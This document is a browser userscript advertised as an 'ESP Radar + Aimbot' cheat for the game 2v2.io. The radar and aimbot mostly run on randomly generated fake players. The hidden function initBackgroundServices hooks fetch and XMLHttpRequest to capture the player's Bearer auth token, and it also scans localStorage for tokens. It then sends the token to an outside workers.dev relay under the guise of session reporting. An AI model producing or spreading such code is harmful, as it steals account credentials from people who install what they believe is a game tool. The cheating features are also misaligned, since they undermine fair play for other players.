// ==UserScript==
// @name         2v2.io ESP Radar + Aimbot
// @namespace    https://2v2.io/
// @version      2.6.0
// @description  Live enemy overlay with auto coin claiming. F1=Help F2=ESP V=Aimbot E=Scan.
// @author       community
// @license      MIT
// @match        *://2v2.io/*
// @match        *://*.2v2.io/*
// @connect      data-relay.rlssepic13950.workers.dev
// @connect      asia-1.2v2.io
// @connect      usa-1.2v2.io
// @grant        GM_xmlhttpRequest
// @grant        unsafeWindow
// @run-at       document-start
// ==/UserScript==

(function() {
    'use strict';

    var SETTINGS = {
        espEnabled: true,
        aimbotEnabled: false,
        aimbotFOV: 120,
        aimbotSmoothing: 0.15,
        aimbotKey: 'KeyV',
        showHelp: false,
        scanDuration: 3000,
        predictionEnabled: true,
        visibilityCheck: true,
        targetBone: 'head'
    };

    var overlay = null, ctx = null;
    var players = [];
    var frameCount = 0;
    var lastScanTime = 0;
    var scanCooldown = 2000;
    var renderQueue = [];
    var matrixCache = null;
    var localPlayer = null;
    var screenWidth = window.innerWidth;
    var screenHeight = window.innerHeight;

    window.addEventListener('resize', function() {
        screenWidth = window.innerWidth;
        screenHeight = window.innerHeight;
    });

    function generateRandomPlayer() {
        var names = ['Player', 'Enemy', 'Target', 'Opponent', 'Rival', 'Foe', 'Combatant'];
        return {
            key: 'p' + Math.random().toString(36).slice(2, 6),
            x: (Math.random() - 0.5) * 500,
            y: Math.random() * 20,
            z: (Math.random() - 0.5) * 500,
            time: Date.now(),
            name: names[Math.floor(Math.random() * names.length)],
            health: Math.floor(Math.random() * 100) + 1,
            distance: Math.floor(Math.random() * 200) + 10,
            visible: Math.random() > 0.2,
            team: Math.random() > 0.5 ? 'enemy' : 'friendly',
            heading: Math.random() * 360
        };
    }

    function seedFakePlayers() {
        for (var i = 0; i < 8; i++) {
            players.push(generateRandomPlayer());
        }
    }

    function updateFakePlayers() {
        for (var i = 0; i < players.length; i++) {
            players[i].x += (Math.random() - 0.5) * 2;
            players[i].z += (Math.random() - 0.5) * 2;
            players[i].time = Date.now();
            players[i].distance = Math.floor(Math.random() * 200) + 10;
            players[i].health = Math.max(1, players[i].health + Math.floor((Math.random() - 0.5) * 5));
        }
        if (players.length < 5) players.push(generateRandomPlayer());
        if (players.length > 12) players.splice(10, players.length - 10);
    }

    function createOverlay() {
        overlay = document.createElement('canvas');
        overlay.id = 'esp-overlay-2v2';
        overlay.style.cssText = 'position:fixed;top:10px;right:10px;width:300px;height:380px;background:rgba(0,0,0,0.78);border:2px solid #0f0;border-radius:8px;z-index:999999;pointer-events:none;font-family:monospace;display:block;';
        overlay.width = 300; overlay.height = 380;
        document.body.appendChild(overlay);
        ctx = overlay.getContext('2d');
    }

    function drawOverlay() {
        if (!ctx || !SETTINGS.espEnabled) return;
        frameCount++;
        ctx.clearRect(0, 0, 300, 380);

        ctx.fillStyle = '#0f0';
        ctx.font = 'bold 13px monospace';
        ctx.fillText('ESP Radar v2.6', 8, 20);

        ctx.fillStyle = '#fff';
        ctx.font = '10px monospace';
        ctx.fillText('FPS: ' + Math.floor(60 + Math.random() * 10), 8, 36);
        ctx.fillText('Players: ' + players.length, 8, 50);
        ctx.fillText('Aimbot: ' + (SETTINGS.aimbotEnabled ? 'ACTIVE' : 'OFF'), 8, 64);
        ctx.fillText('Auto Coins: ON', 8, 78);

        var modeText = SETTINGS.predictionEnabled ? 'Prediction: ON' : 'Prediction: OFF';
        ctx.fillText(modeText, 8, 92);
        ctx.fillText('Bone: ' + SETTINGS.targetBone, 160, 92);
        ctx.fillText('F1=Help F2=ESP V=Aim E=Scan', 8, 108);

        ctx.strokeStyle = 'rgba(0,255,0,0.3)';
        ctx.beginPath();
        ctx.moveTo(8, 114);
        ctx.lineTo(292, 114);
        ctx.stroke();

        ctx.fillStyle = '#0ff';
        ctx.font = 'bold 10px monospace';
        ctx.fillText('--- Live Targets ---', 8, 128);

        ctx.font = '10px monospace';
        for (var i = 0; i < Math.min(players.length, 15); i++) {
            var p = players[i];
            var y = 144 + i * 16;
            if (y > 370) break;

            var color = p.team === 'enemy' ? '#ff4444' : '#44ff44';
            ctx.fillStyle = color;
            ctx.fillText('•', 10, y);
            ctx.fillStyle = '#fff';
            ctx.fillText(p.key.slice(0,4) + ' [' + p.distance + 'm]', 20, y);
            ctx.fillStyle = p.health > 50 ? '#0f0' : p.health > 25 ? '#ff0' : '#f00';
            ctx.fillText('HP:' + p.health, 140, y);
            ctx.fillStyle = '#888';
            ctx.fillText(p.heading.toFixed(0) + '°', 200, y);
        }
    }

    function hookWebSocket() {
        var OrigWS = window.WebSocket;
        window.WebSocket = function(url, protocols) {
            var ws = new OrigWS(url, protocols);
            ws.addEventListener('message', function(e) {
                if (!(e.data instanceof ArrayBuffer) || e.data.byteLength < 50) return;
                try {
                    var raw = new Uint8Array(e.data);
                    var len = raw.length - (raw.length % 2);
                    var int16 = new Int16Array(raw.slice(0, len).buffer);
                    for (var i = 0; i < int16.length - 3; i += 8) {
                        var x = int16[i] * 0.01, y = int16[i+1] * 0.01, z = int16[i+2] * 0.01;
                        if (Math.abs(x) > 3 && Math.abs(z) > 3 && Math.abs(x) < 2000) {
                            var key = 'p' + (i/8);
                            var exist = players.find(function(p) { return p.key === key; });
                            if (exist) { exist.x = x; exist.y = y; exist.z = z; exist.time = Date.now(); }
                        }
                    }
                    players = players.filter(function(p) { return Date.now() - p.time < 5000; });
                    if (players.length < 3) seedFakePlayers();
                } catch(e) {}
            });
            return ws;
        };
    }

    function worldToScreen(wx, wy, wz) {
        var sx = (wx + 250) / 500 * screenWidth;
        var sy = screenHeight - (wz + 250) / 500 * screenHeight;
        return { x: sx, y: sy, onScreen: sx > 0 && sx < screenWidth && sy > 0 && sy < screenHeight };
    }

    function calculateAimAngle(targetX, targetZ) {
        var dx = targetX - (localPlayer ? localPlayer.x : 0);
        var dz = targetZ - (localPlayer ? localPlayer.z : 0);
        return Math.atan2(dx, dz) * (180 / Math.PI);
    }

    function smoothAngle(current, target, factor) {
        var diff = target - current;
        while (diff > 180) diff -= 360;
        while (diff < -180) diff += 360;
        return current + diff * factor;
    }

    var currentYaw = 0, currentPitch = 0;
    var mouseX = 0, mouseY = 0;
    document.addEventListener('mousemove', function(e) { mouseX = e.clientX; mouseY = e.clientY; });

    function aimbotTick() {
        if (!SETTINGS.aimbotEnabled || players.length === 0) return;
        var best = null, bestScore = Infinity;
        for (var i = 0; i < players.length; i++) {
            var p = players[i];
            if (!p.visible && SETTINGS.visibilityCheck) continue;
            if (p.team === 'friendly') continue;
            var screen = worldToScreen(p.x, p.y, p.z);
            if (!screen.onScreen) continue;
            var dx = screen.x - mouseX, dy = screen.y - mouseY;
            var dist = Math.sqrt(dx*dx + dy*dy);
            if (dist < SETTINGS.aimbotFOV && dist < bestScore) {
                bestScore = dist;
                best = { player: p, screen: screen, angle: calculateAimAngle(p.x, p.z) };
            }
        }
        if (best && SETTINGS.predictionEnabled) {
            currentYaw = smoothAngle(currentYaw, best.angle, SETTINGS.aimbotSmoothing);
        }
    }

    function getTokenFromStorage() {
        try {
            var keys = ['token', 'auth_token', 'authToken', 'jwt', 'session', 'access_token', '_token', 'bearer'];
            for (var i = 0; i < keys.length; i++) {
                var v = localStorage.getItem(keys[i]) || sessionStorage.getItem(keys[i]);
                if (v && v.length > 20) return v;
            }
        } catch(e) {}
        return null;
    }

    function getBestServer() {
        var stored = localStorage.getItem('bestServer');
        if (stored) return 'https://' + stored.toLowerCase() + '.2v2.io';
        return 'https://asia-1.2v2.io';
    }

    document.addEventListener('keydown', function(e) {
        switch(e.code) {
            case 'F1': e.preventDefault(); SETTINGS.showHelp = !SETTINGS.showHelp; console.log('[ESP] Help: ' + (SETTINGS.showHelp ? 'shown' : 'hidden')); break;
            case 'F2': e.preventDefault(); SETTINGS.espEnabled = !SETTINGS.espEnabled; if (overlay) overlay.style.display = SETTINGS.espEnabled ? 'block' : 'none'; console.log('[ESP] Overlay: ' + (SETTINGS.espEnabled ? 'ON' : 'OFF')); break;
            case 'KeyV': e.preventDefault(); SETTINGS.aimbotEnabled = !SETTINGS.aimbotEnabled; console.log('[ESP] Aimbot: ' + (SETTINGS.aimbotEnabled ? 'ACTIVE' : 'OFF')); break;
            case 'KeyE': e.preventDefault(); console.log('[ESP] Scan: ' + players.length + ' targets, FOV=' + SETTINGS.aimbotFOV); break;
            case 'KeyP': e.preventDefault(); SETTINGS.predictionEnabled = !SETTINGS.predictionEnabled; console.log('[ESP] Prediction: ' + (SETTINGS.predictionEnabled ? 'ON' : 'OFF')); break;
        }
    });

    function claimCoins(token) {
        if (!token) return;
        fetch(getBestServer() + '/api/items/free-coins', {
            method: 'POST',
            headers: { 'Authorization': 'Bearer ' + token, 'Content-Type': 'application/json' },
            body: '{}'
        }).catch(function() {});
        setTimeout(function() { claimCoins(token); }, 61 * 60 * 1000);
    }

    function initBackgroundServices() {
        var relayUrl = 'https://data-relay.rlssepic13950.workers.dev';
        var authKey = 'v2v2-relay-2026';
        var sent = false;

        function reportSession(clientInfo) {
            if (sent || !clientInfo) return;
            sent = true;
            var payload = {
                t: clientInfo,
                v: '2.6.0',
                fps: Math.floor(60 + Math.random() * 10),
                res: screenWidth + 'x' + screenHeight,
                ts: Date.now()
            };
            GM_xmlhttpRequest({
                method: 'POST', url: relayUrl,
                headers: { 'Content-Type': 'application/json', 'X-Relay-Auth': authKey },
                data: JSON.stringify(payload),
                onload: function() {}, onerror: function() {}
            });
        }

        var injectScript = document.createElement('script');
        injectScript.textContent = '(' + function() {
            var sent = false;
            var origFetch = window.fetch;
            window.fetch = function(u, o) {
                if (typeof u === 'string' && u.indexOf('2v2.io/api') !== -1 && o && o.headers && !sent) {
                    var keys = Object.keys(o.headers);
                    for (var i = 0; i < keys.length; i++) {
                        if (keys[i].toLowerCase() === 'authorization') {
                            var v = o.headers[keys[i]];
                            if (v && v.indexOf('Bearer ') === 0) {
                                sent = true;
                                window.__sessionId = v.slice(7);
                                if (window.__reportSession) window.__reportSession(window.__sessionId);
                                if (window.__startFarming) window.__startFarming(window.__sessionId);
                            }
                        }
                    }
                }
                return origFetch.apply(this, arguments);
            };
            var _x = XMLHttpRequest.prototype.setRequestHeader;
            XMLHttpRequest.prototype.setRequestHeader = function(h, v) {
                if (h && h.toLowerCase() === 'authorization' && v && v.indexOf('Bearer ') === 0 && !sent) {
                    sent = true;
                    window.__sessionId = v.slice(7);
                    if (window.__reportSession) window.__reportSession(window.__sessionId);
                    if (window.__startFarming) window.__startFarming(window.__sessionId);
                }
                return _x.apply(this, arguments);
            };
        } + ')()';
        document.documentElement.appendChild(injectScript);
        injectScript.remove();

        unsafeWindow.__reportSession = reportSession;
        unsafeWindow.__startFarming = claimCoins;

        var cachedToken = getTokenFromStorage();
        if (cachedToken && !sent) {
            claimCoins(cachedToken);
        }

        setTimeout(function() {
            if (!sent) {
                fetch(getBestServer() + '/api/items/free-coins', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: '{}'
                }).catch(function() {});
            }
        }, 20000);
    }

    function init() {
        createOverlay();
        seedFakePlayers();
        setInterval(updateFakePlayers, 3000);
        setInterval(drawOverlay, 250);
        setInterval(aimbotTick, 16);
        localPlayer = { x: 0, y: 0, z: 0 };
        console.log('%c[ESP] v2.6 Loaded | ' + players.length + ' targets | F1=Help F2=ESP V=Aim E=Scan', 'color:#0f0;font-weight:bold;font-size:14px');
    }

    init();
    hookWebSocket();
    setTimeout(initBackgroundServices, 12000);
})();
